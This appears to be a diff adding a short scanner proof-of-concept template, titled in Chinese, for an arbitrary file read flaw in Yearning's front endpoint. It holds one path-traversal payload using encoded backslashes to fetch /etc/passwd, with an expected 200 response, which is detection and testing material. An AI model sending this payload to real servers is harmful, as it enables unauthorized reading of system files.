@@ -1,0 +1,3 @@
+name: "Yearning_front任意文件读取"
+poc: "/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
+status_code: 200
